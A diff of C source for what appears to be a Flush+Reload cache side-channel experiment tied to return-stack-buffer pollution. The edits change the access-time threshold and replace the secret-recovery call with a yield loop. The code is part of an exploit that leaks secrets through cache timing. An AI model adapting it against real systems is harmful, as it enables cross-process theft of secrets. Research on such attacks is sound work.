@@ -9,7 +9,7 @@ char* array;
 volatile void spacer() {
 	asm(
 		// ".rept 2235;"
-		".rept 1581;"
+		".rept 1787;"
 		"nop;"
 		".endr;"
 	);
@@ -30,7 +30,7 @@ void flushAndReload(int* timer){
 	}
 	// wait some time for the attack to happen
 	// for(int i=0; i<5; i++){
-	// 	sched_yield();
+	// sched_yield();
 	// }
 	sleep(sleepTime);
 	// _mm_pause();
@@ -42,7 +42,7 @@ void flushAndReload(int* timer){
 
 	//measure_one_block_access_time(ADDR_PTR(&array[20*offset]))
 	for(int i=lowerBound; i<=upperBound; i++){
-		timer[i]+= measure_one_block_access_time(ADDR_PTR(&array[i*offset]));
+		timer[i]+= measure_one_block_access_time(ADDR_PTR(&array[i*offset]))>100?1:-1;
 	}
 }
 
@@ -54,16 +54,16 @@ int getSecret(int repeat){
 	}
 
 	for(int i=0; i<repeat; i++){
-		printf("iteration %i...\n", i);
+		//printf("iteration %i...\n", i);
 		flushAndReload(timer);
 	}
 
 	int secret = 0, lowestAccessTime = INT_MAX;
 	for(int i=0; i<=upperBound; i++){
-		printf("%i: %i\n", i, timer[i]/nAttackRepeat);
-		if(timer[i]/nAttackRepeat<lowestAccessTime){
+		printf("%i: %i\n", i, timer[i]);
+		if(timer[i]<lowestAccessTime){
 			secret = i;
-			lowestAccessTime = timer[i]/nAttackRepeat;
+			lowestAccessTime = timer[i];
 		}
 	}
 
@@ -122,13 +122,17 @@ int main(int argc, char *argv[]){
 	    // memory map the shared memory object
 	    array = (char*)mmap(0, SIZE, PROT_WRITE, MAP_SHARED, shm_fd, 0);
 
-		sleep(1);
-		// for (int i = 0; i < 9; i++) {
-		// 	printf("value at secret %i is %c\n", i, array[i*offset]);
-		// printf("VA of secret %i is %p\n", i, (void *)&array[i*offset]);
-		// }
-	    // flushing out every entry
-	    getSecret(nAttackRepeat);
+		// sleep(1);
+		// // for (int i = 0; i < 9; i++) {
+		// // 	printf("value at secret %i is %c\n", i, array[i*offset]);
+		// // printf("VA of secret %i is %p\n", i, (void *)&array[i*offset]);
+		// // }
+	 //    // flushing out every entry
+	 //    getSecret(nAttackRepeat);
+	    while(1){
+	    	sched_yield();
+	    }
+
 		//access time to the array;
 		kill(pid, SIGKILL);
 		printf("RSB pollution ended\n");
